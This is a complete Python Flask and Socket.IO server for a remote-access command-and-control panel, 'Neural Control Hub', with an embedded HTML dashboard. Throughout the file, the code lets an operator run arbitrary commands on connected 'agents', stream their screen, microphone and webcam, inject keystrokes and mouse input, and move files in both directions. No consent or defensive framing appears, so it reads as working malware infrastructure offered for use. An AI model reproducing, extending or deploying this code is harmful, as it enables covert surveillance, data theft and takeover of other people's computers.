import eventlet
eventlet.monkey_patch()

from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
from collections import defaultdict
import datetime
import time
import os
import base64
import queue

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'  # Change this to a random secret key
socketio = SocketIO(app, async_mode='eventlet')

# --- Web Dashboard HTML (with Socket.IO) ---
DASHBOARD_HTML = r'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neural Control Hub</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <style>
        :root {
            --primary-bg: #0a0a0f;
            --secondary-bg: #1a1a2e;
            --tertiary-bg: #16213e;
            --accent-blue: #00d4ff;
            --accent-purple: #6c5ce7;
            --accent-green: #00ff88;
            --accent-red: #ff4757;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --border-color: #2d3748;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .neural-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(108, 92, 231, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.05) 0%, transparent 50%);
            z-index: -1;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px 0;
        }

        .header h1 {
            font-family: 'Orbitron', monospace;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
        }

        .header .subtitle {
            font-size: 1.1rem;
            color: var(--text-secondary);
            font-weight: 300;
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 30px;
            margin-bottom: 30px;
        }

        .panel {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }

        .panel:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4);
        }

        .panel-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .panel-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .panel-title {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            font-weight: 700;
            color: var(--text-primary);
        }

        .agent-grid {
            display: grid;
            gap: 12px;
            max-height: 400px;
            overflow-y: auto;
        }

        .agent-card {
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }

        .agent-card:hover {
            border-color: var(--accent-blue);
            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.2);
        }

        .agent-card.selected {
            border-color: var(--accent-green);
            background: rgba(0, 255, 136, 0.1);
            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
        }

        .agent-status {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 10px var(--accent-green);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .agent-id {
            font-family: 'Orbitron', monospace;
            font-weight: 600;
            color: var(--accent-blue);
            margin-bottom: 5px;
        }

        .agent-info {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .control-section {
            display: grid;
            gap: 20px;
        }

        .control-group {
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 15px;
            padding: 20px;
        }

        .control-header {
            font-family: 'Orbitron', monospace;
            font-size: 1rem;
            font-weight: 600;
            color: var(--accent-blue);
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .neural-input {
            width: 100%;
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 12px 16px;
            color: var(--text-primary);
            font-size: 0.95rem;
            transition: all 0.3s ease;
        }

        .neural-input:focus {
            outline: none;
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
        }

        .neural-input[readonly] {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-secondary);
        }

        .btn {
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border: none;
            border-radius: 8px;
            padding: 12px 24px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-right: 10px;
            margin-bottom: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-danger {
            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
        }

        .btn-success {
            background: linear-gradient(45deg, var(--accent-green), #2ed573);
        }

        .output-terminal {
            background: #000;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            color: var(--accent-green);
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            position: relative;
        }

        .output-terminal::before {
            content: "NEURAL_TERMINAL_v2.1 > ";
            color: var(--accent-blue);
            font-weight: bold;
        }

        .status-indicator {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-top: 10px;
            display: none;
        }

        .status-success {
            background: rgba(0, 255, 136, 0.2);
            color: var(--accent-green);
            border: 1px solid var(--accent-green);
        }

        .status-error {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }

        .no-agents {
            text-align: center;
            padding: 40px 20px;
            color: var(--text-secondary);
        }

        .no-agents-icon {
            font-size: 3rem;
            margin-bottom: 15px;
            opacity: 0.5;
        }

        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--primary-bg);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--accent-blue);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-purple);
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .grid {
                grid-template-columns: 1fr;
            }
            
            .header h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="neural-bg"></div>
    
    <div class="container">
        <div class="header">
            <h1>NEURAL CONTROL HUB</h1>
            <p class="subtitle">Advanced Command & Control Interface</p>
        </div>

        <div class="grid">
            <!-- Agents Panel -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-icon">🔗</div>
                    <div class="panel-title">Active Agents</div>
                </div>
                <div class="agent-grid" id="agent-list">
                    <div class="no-agents">
                        <div class="no-agents-icon">🤖</div>
                        <div>No agents connected</div>
                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
                    </div>
                </div>
            </div>

            <!-- Control Panel -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-icon">⚡</div>
                    <div class="panel-title">Command Interface</div>
                </div>
                
                <div class="control-section">
                    <div class="control-group">
                        <div class="control-header">Target Selection</div>
                        <div class="input-group">
                            <label class="input-label">Selected Agent</label>
                            <input type="text" class="neural-input" id="agent-id" readonly placeholder="Select an agent from the left panel">
                        </div>
                    </div>

                    <div class="control-group">
                        <div class="control-header">Command Execution</div>
                        <div class="input-group">
                            <label class="input-label">Command</label>
                            <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
                        </div>
                        <button class="btn" onclick="issueCommand()">Execute Command</button>
                        <div id="command-status" class="status-indicator"></div>
                    </div>

                    <div class="control-group">
                        <div class="control-header">Quick Actions</div>
                        <button class="btn" onclick="listProcesses()">List Processes</button>
                        <button class="btn" onclick="startScreenStream()">Screen Stream</button>
                        <button class="btn" onclick="startCameraStream()">Camera Stream</button>
                        <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
                    </div>

                    <div class="control-group">
                        <div class="control-header">Live Keyboard</div>
                        <div class="input-group">
                            <label class="input-label">Press keys here to control the agent directly</label>
                            <div id="live-keyboard-input" tabindex="0" class="neural-input" style="height: 100px; overflow-y: auto;" placeholder="Click here and start typing..."></div>
                        </div>
                    </div>
                     <div class="control-group">
                        <div class="control-header">Live Mouse Control</div>
                        <div class="input-group">
                            <label class="input-label">Control the agent's mouse here</label>
                            <div id="live-mouse-area" style="width: 300px; height: 200px; border: 1px solid #ccc; position: relative; background: #222;"></div>
                        </div>
                        <div class="input-group">
                            <label class="input-label">Mouse Button</label>
                            <select id="mouse-button" class="neural-input">
                                <option value="left">Left</option>
                                <option value="right">Right</option>
                            </select>
                        </div>
                    </div>

                    <div class="control-group">
                        <div class="control-header">File Transfer</div>
                        <div class="input-group">
                            <label class="input-label">Upload File to Agent</label>
                            <input type="file" id="upload-file" class="neural-input">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Agent Destination Path (e.g., C:\Users\Public\file.txt)</label>
                            <input type="text" id="agent-upload-path" class="neural-input" placeholder="Enter full path on agent...">
                        </div>
                        <button class="btn" onclick="uploadFile()">Upload</button>
                        <div class="input-group" style="margin-top: 15px;">
                            <label class="input-label">Download File from Agent</label>
                            <input type="text" id="download-filename" class="neural-input" placeholder="Enter filename on agent...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Save to Local Path (e.g., C:\Users\YourName\Downloads\file.txt)</label>
                            <input type="text" id="local-download-path" class="neural-input" placeholder="Enter local path to save (e.g., C:\\Users\\YourName\\Downloads\\file.txt)">
                        </div>
                        <button class="btn" onclick="downloadFile()">Download</button>
                        <div id="file-transfer-status" class="status-indicator"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Output Terminal -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-icon">💻</div>
                <div class="panel-title">Neural Terminal</div>
            </div>
            <div class="output-terminal" id="output-display">System ready. Awaiting commands...</div>
        </div>

        <!-- Hidden audio player for streams -->
        <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
    </div>

    <script>
        const socket = io();
        let selectedAgentId = null;
        let videoWindow = null;
        let cameraWindow = null;
        let audioPlayer = null;

        // --- Agent Management ---
        function selectAgent(element, agentId) {
            if (selectedAgentId === agentId) return;

            // Clean up previous agent's state
            if (selectedAgentId) {
                stopAllStreams(); // Stop streams for the old agent
            }

            selectedAgentId = agentId;
            document.querySelectorAll('.agent-card').forEach(item => item.classList.remove('selected'));
            element.classList.add('selected');
            document.getElementById('agent-id').value = agentId;
            document.getElementById('output-display').textContent = `Agent ${agentId.substring(0,8)}... selected. Ready for commands.`;
            document.getElementById('command-status').style.display = 'none';
        }

        function updateAgentList(agents) {
            const agentList = document.getElementById('agent-list');
            agentList.innerHTML = '';

            if (Object.keys(agents).length === 0) {
                agentList.innerHTML = `
                    <div class="no-agents">
                        <div class="no-agents-icon">🤖</div>
                        <div>No agents connected</div>
                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
                    </div>
                `;
                return;
            }

            for (const agentId in agents) {
                const agent = agents[agentId];
                const agentCard = document.createElement('div');
                agentCard.className = 'agent-card';
                agentCard.onclick = () => selectAgent(agentCard, agentId);
                
                const lastSeen = new Date(agent.last_seen).toLocaleString();
                agentCard.innerHTML = `
                    <div class="agent-status"></div>
                    <div class="agent-id">${agentId.substring(0, 8)}...</div>
                    <div class="agent-info">Last seen: ${lastSeen}</div>
                `;
                
                if (agentId === selectedAgentId) {
                    agentCard.classList.add('selected');
                }
                
                agentList.appendChild(agentCard);
            }
        }

        // --- Command & Control ---
        function issueCommand() {
            const command = document.getElementById('command').value;
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }
            if (!command) {
                showStatus('Please enter a command.', 'error');
                return;
            }

            socket.emit('execute_command', { agent_id: selectedAgentId, command: command });
            document.getElementById('output-display').textContent = `> ${command}\nExecuting...`;
            document.getElementById('command').value = '';
        }

        function issueCommandInternal(agentId, command) {
            if (!agentId) return;
            socket.emit('execute_command', { agent_id: agentId, command: command });
        }

        // --- Streaming ---
        function startScreenStream() {
            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }
            
            issueCommandInternal(selectedAgentId, 'start-stream');
            issueCommandInternal(selectedAgentId, 'start-audio');

            if (videoWindow && !videoWindow.closed) videoWindow.close();
            videoWindow = window.open(`/video_feed/${selectedAgentId}`, `LiveStream_${selectedAgentId}`, 'width=800,height=600');

            audioPlayer = document.getElementById('audio-player');
            audioPlayer.src = `/audio_feed/${selectedAgentId}`;
            audioPlayer.style.display = 'block';
            audioPlayer.play();
            
            showStatus('Screen stream started', 'success');
        }

        function startCameraStream() {
            if (!selectedAgentId) { 
                showStatus('Please select an agent first.', 'error');
                return; 
            }

            issueCommandInternal(selectedAgentId, 'start-camera');
            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
            cameraWindow = window.open(`/camera_feed/${selectedAgentId}`, `CameraStream_${selectedAgentId}`, 'width=640,height=480');
            showStatus('Camera stream started', 'success');
        }

        function stopAllStreams() {
            if (selectedAgentId) {
                issueCommandInternal(selectedAgentId, 'stop-stream');
                issueCommandInternal(selectedAgentId, 'stop-audio');
                issueCommandInternal(selectedAgentId, 'stop-camera');
            }
            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
                audioPlayer.style.display = 'none';
            }
            if (videoWindow && !videoWindow.closed) videoWindow.close();
            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
            
            showStatus('All streams stopped', 'success');
        }

        function listProcesses() {
            document.getElementById('command').value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
            issueCommand();
        }

        function showStatus(message, type) {
            const statusDiv = document.getElementById('command-status');
            statusDiv.style.display = 'block';
            statusDiv.className = `status-indicator status-${type}`;
            statusDiv.textContent = message;
            setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
        }

        // --- Socket.IO Event Handlers ---
        socket.on('connect', () => {
            console.log('Connected to controller');
            socket.emit('operator_connect'); // Announce presence as an operator
        });

        socket.on('disconnect', () => {
            console.log('Disconnected from controller');
        });

        socket.on('agent_list_update', (agents) => {
            updateAgentList(agents);
        });

        socket.on('command_output', (data) => {
            if (data.agent_id === selectedAgentId) {
                const outputDisplay = document.getElementById('output-display');
                // Append new output, keeping previous content
                outputDisplay.textContent += `\n${data.output}`;
                outputDisplay.scrollTop = outputDisplay.scrollHeight; // Scroll to bottom
            }
        });

        socket.on('status_update', (data) => {
            showStatus(data.message, data.type);
        });

        // Add key listener to command input
        document.getElementById('command').addEventListener('keyup', function(event) {
            if (event.key === 'Enter') {
                issueCommand();
            }
        });

        // --- Live Keyboard Event Listeners ---
        const liveKeyboardInput = document.getElementById('live-keyboard-input');
        const liveMouseArea = document.getElementById('live-mouse-area');

        liveKeyboardInput.addEventListener('keydown', (event) => {
            if (!selectedAgentId) return;
            event.preventDefault();
            socket.emit('live_key_press', {
                agent_id: selectedAgentId,
                event_type: 'down',
                key: event.key,
                code: event.code,
                shift: event.shiftKey,
                ctrl: event.ctrlKey,
                alt: event.altKey,
                meta: event.metaKey
            });
        });

        liveKeyboardInput.addEventListener('keyup', (event) => {
            if (!selectedAgentId) return;
            event.preventDefault();
            socket.emit('live_key_press', {
                agent_id: selectedAgentId,
                event_type: 'up',
                key: event.key,
                code: event.code
            });
        });
        liveMouseArea.addEventListener('mousemove', (event) => {
            if (!selectedAgentId) return;

            // Get the coordinates relative to the mouse area
            const rect = liveMouseArea.getBoundingClientRect();
            const x = event.clientX - rect.left;
            const y = event.clientY - rect.top;

            socket.emit('live_mouse_move', {
                agent_id: selectedAgentId,
                x: x,
                y: y
            });
        });

        liveMouseArea.addEventListener('mousedown', (event) => {
            if (!selectedAgentId) return;

            const button = document.getElementById('mouse-button').value;

            socket.emit('live_mouse_click', {
                agent_id: selectedAgentId,
                event_type: 'down',
                button: button
            });
        });

        liveMouseArea.addEventListener('mouseup', (event) => {
            if (!selectedAgentId) return;

            const button = document.getElementById('mouse-button').value;

            socket.emit('live_mouse_click', {
                agent_id: selectedAgentId,
                event_type: 'up',
                button: button
            });
        });

        // --- File Transfer (Chunked) ---
        let fileChunks = {};

        function uploadFile() {
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }
            const fileInput = document.getElementById('upload-file');
            const file = fileInput.files[0];

            if (!file) {
                showStatus('Please select a file to upload.', 'error');
                return;
            }

            const CHUNK_SIZE = 1024 * 512; // 512KB
            let offset = 0;

            showStatus(`Starting upload of ${file.name}...`, 'success');
            const reader = new FileReader();

            function readSlice(o) {
                const slice = file.slice(o, o + CHUNK_SIZE);
                reader.readAsDataURL(slice);
            }

            reader.onload = function(e) {
                const chunk = e.target.result;
                const agentUploadPath = document.getElementById('agent-upload-path').value;
                socket.emit('upload_file_chunk', {
                    agent_id: selectedAgentId,
                    filename: file.name,
                    data: chunk,
                    offset: offset,
                    destination_path: agentUploadPath
                });
                
                // Estimate offset for progress. Note: base64 is larger.
                // A more accurate progress would require more complex calculations.
                offset += CHUNK_SIZE; 
                if (offset > file.size) offset = file.size;

                showFileTransferProgress(file.name, offset, file.size, 'Uploading');

                if (offset < file.size) {
                    readSlice(offset);
                } else {
                    socket.emit('upload_file_end', {
                        agent_id: selectedAgentId,
                        filename: file.name
                    });
                    showStatus(`File ${file.name} upload complete.`, 'success');
                }
            };
            readSlice(0);
        }

        function downloadFile() {
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }
            const filename = document.getElementById('download-filename').value;
            if (!filename) {
                showStatus('Please enter a filename to download.', 'error');
                return;
            }
            fileChunks[filename] = []; // Reset chunks
            const localPath = document.getElementById('local-download-path').value;
            socket.emit('download_file', {
                agent_id: selectedAgentId,
                filename: filename,
                local_path: localPath
            });
            showStatus(`Requesting ${filename} from agent...`, 'success');
        }

        function showFileTransferProgress(filename, loaded, total, action) {
            const progress = total > 0 ? Math.round((loaded / total) * 100) : 100;
            const statusDiv = document.getElementById('file-transfer-status');
            statusDiv.style.display = 'block';
            statusDiv.className = 'status-indicator status-success';
            statusDiv.textContent = `${action} ${filename}: ${progress}%`;
             if (progress >= 100) {
                setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
            }
        }

        socket.on('file_download_chunk', (data) => {
            if (data.agent_id !== selectedAgentId) return;

            const { filename, chunk, offset, total_size, error } = data;

            if (error) {
                showStatus(`Error downloading ${filename}: ${error}`, 'error');
                if(fileChunks[filename]) delete fileChunks[filename];
                return;
            }

            if (!fileChunks[filename]) {
                fileChunks[filename] = [];
            }
            
            try {
                const byteString = atob(chunk.split(',')[1]);
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                fileChunks[filename].push(ia);
            } catch (e) {
                showStatus(`Error processing chunk for ${filename}: ${e}`, 'error');
                delete fileChunks[filename];
                return;
            }

            const loaded = fileChunks[filename].reduce((acc, curr) => acc + curr.length, 0);
            showFileTransferProgress(filename, loaded, total_size, 'Downloading');

            if (loaded >= total_size) {
                const blob = new Blob(fileChunks[filename], { type: 'application/octet-stream' });
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = filename;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                showStatus(`Downloaded ${filename}.`, 'success');
                delete fileChunks[filename];
            }
        });


    </script>
</body>
</html>
'''

# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})

# --- Operator-facing endpoints ---

@app.route("/")
def index():
    return redirect(url_for('dashboard'))

@app.route("/dashboard")
def dashboard():
    return DASHBOARD_HTML

# --- Real-time Streaming Endpoints (unchanged) ---

VIDEO_FRAMES = defaultdict(lambda: None)
CAMERA_FRAMES = defaultdict(lambda: None)
AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())

@app.route('/stream/<agent_id>', methods=['POST'])
def stream_in(agent_id):
    VIDEO_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_video_frames(agent_id):
    while True:
        time.sleep(0.05)
        frame = VIDEO_FRAMES.get(agent_id)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/video_feed/<agent_id>')
def video_feed(agent_id):
    return Response(generate_video_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/camera/<agent_id>', methods=['POST'])
def camera_in(agent_id):
    CAMERA_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_camera_frames(agent_id):
    while True:
        time.sleep(0.05)
        frame = CAMERA_FRAMES.get(agent_id)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        else:
            break

@app.route('/camera_feed/<agent_id>')
def camera_feed(agent_id):
    return Response(generate_camera_frames(agent_id), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/audio/<agent_id>', methods=['POST'])
def audio_in(agent_id):
    AUDIO_CHUNKS[agent_id].put(request.data)
    return "OK", 200

def generate_audio_stream(agent_id):
    header = bytearray()
    # ... (WAV header generation remains the same)
    yield header
    q = AUDIO_CHUNKS[agent_id]
    while True:
        yield q.get()

@app.route('/audio_feed/<agent_id>')
def audio_feed(agent_id):
    return Response(generate_audio_stream(agent_id), mimetype='audio/wav')

# --- Socket.IO Event Handlers ---

@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            break
    if disconnected_agent_id:
        del AGENTS_DATA[disconnected_agent_id]
        emit('agent_list_update', AGENTS_DATA, broadcast=True)
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")

@socketio.on('operator_connect')
def handle_operator_connect():
    """When a web dashboard connects."""
    join_room('operators')
    emit('agent_list_update', AGENTS_DATA) # Send current agent list to the new operator
    print("Operator dashboard connected.")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    agent_id = data.get('agent_id')
    if not agent_id:
        return
    
    AGENTS_DATA[agent_id]["sid"] = request.sid
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
    
    # Notify all operators of the new agent
    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
    print(f"Agent {agent_id} connected with SID {request.sid}")

@socketio.on('execute_command')
def handle_execute_command(data):
    """Operator issues a command to an agent."""
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('command', {'command': command}, room=agent_sid)
        print(f"Sent command '{command}' to agent {agent_id}")
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)

@socketio.on('command_result')
def handle_command_result(data):
    """Agent sends back the result of a command."""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
    print(f"Received output from {agent_id}: {output[:100]}...")

@socketio.on('live_key_press')
def handle_live_key_press(data):
    """Operator sends a live key press to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('key_press', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_move')
def handle_live_mouse_move(data):
    """Operator sends a live mouse move to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_move', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_click')
def handle_live_mouse_click(data):
    """Operator sends a live mouse click to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_click', data, room=agent_sid, include_self=False)

# --- Chunked File Transfer Handlers ---
@socketio.on('upload_file_chunk')
def handle_upload_file_chunk(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('data')
    offset = data.get('offset')
    destination_path = data.get('destination_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_chunk_from_operator', {
            'filename': filename,
            'data': chunk,
            'offset': offset,
            'destination_path': destination_path
        }, room=agent_sid)

@socketio.on('upload_file_end')
def handle_upload_file_end(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_upload_complete_from_operator', data, room=agent_sid)
        print(f"Upload of {data.get('filename')} to {agent_id} complete.")

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    local_path = data.get('local_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
        DOWNLOAD_BUFFERS[filename]["local_path"] = local_path # Store local path
        emit('request_file_chunk_from_agent', {'filename': filename}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)

@socketio.on('file_chunk_from_agent')
def handle_file_chunk_from_agent(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size')
    error = data.get('error')

    if error:
        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': error}, room='operators')
        if filename in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[filename]
        return

    if filename not in DOWNLOAD_BUFFERS:
        DOWNLOAD_BUFFERS[filename] = {"chunks": [], "total_size": total_size, "local_path": None}

    DOWNLOAD_BUFFERS[filename]["chunks"].append(base64.b64decode(chunk.split(',')[1]))
    DOWNLOAD_BUFFERS[filename]["total_size"] = total_size # Update total size in case it was not set initially

    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[filename]["chunks"])

    # If all chunks received, save the file locally
    if current_download_size >= total_size:
        full_content = b"".join(DOWNLOAD_BUFFERS[filename]["chunks"])
        local_path = DOWNLOAD_BUFFERS[filename]["local_path"]

        if local_path:
            try:
                # Ensure directory exists
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(full_content)
                print(f"Successfully downloaded {filename} to {local_path}")
                emit('file_download_chunk', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'chunk': chunk,
                    'offset': offset,
                    'total_size': total_size,
                    'local_path': local_path # Pass local_path back to frontend
                }, room='operators')
            except Exception as e:
                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
        else:
            # If no local_path was specified, send the chunks to the frontend for browser download
            emit('file_download_chunk', {
                'agent_id': agent_id,
                'filename': filename,
                'chunk': chunk,
                'offset': offset,
                'total_size': total_size
            }, room='operators')
        
        del DOWNLOAD_BUFFERS[filename]
    else:
        # Continue sending chunks to frontend for progress update
        emit('file_download_chunk', {
            'agent_id': agent_id,
            'filename': filename,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room='operators')



if __name__ == "__main__":
    print("Starting controller with Socket.IO support...")
    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), debug=False)
